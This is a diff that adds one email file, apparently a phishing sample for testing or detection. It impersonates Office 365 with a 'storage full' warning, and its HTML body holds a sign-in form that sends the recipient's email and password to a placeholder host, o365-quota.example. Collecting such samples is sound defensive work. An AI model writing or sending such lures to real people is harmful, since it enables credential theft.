@@ -1,0 +1,13 @@
+Delivered-To: kaushal@gmail.com
+Received: from mail.o365-quota.example (mail.o365-quota.example. [203.0.113.10]) by mx.google.com with ESMTPS id mu3gdvk0.65 for <kaushal@gmail.com>; Wed, 16 Sep 2026 02:00:00 +0000
+Authentication-Results: mx.google.com; dkim=pass header.i=@o365-quota.example header.s=s1 header.b=K3fQ9x; spf=pass (google.com: domain of bounce@o365-quota.example designates 203.0.113.10 as permitted sender) smtp.mailfrom=o365-quota.example; dmarc=pass (p=REJECT sp=REJECT dis=NONE) header.from=o365-quota.example
+Date: Wed, 16 Sep 2026 02:00:00 +0000
+From: "Office 365 Team" <team@o365-quota.example>
+To: "Kaushal Shahare" <kaushal@gmail.com>
+Subject: Storage full: messages are being rejected
+Message-ID: <mu3gdvk0.65@o365-quota.example>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: 8bit
+
+<!DOCTYPE html><html><head><meta charset="utf-8"><title></title></head><body style="font-family:Arial,sans-serif;color:#222;background:#ffffff"><p>Your Office 365 storage is full. Sign in to free up space.</p><form action="https://o365-quota.example/signin"><input name="email"><input type="password" name="pwd"><button>Sign in</button></form></body></html>
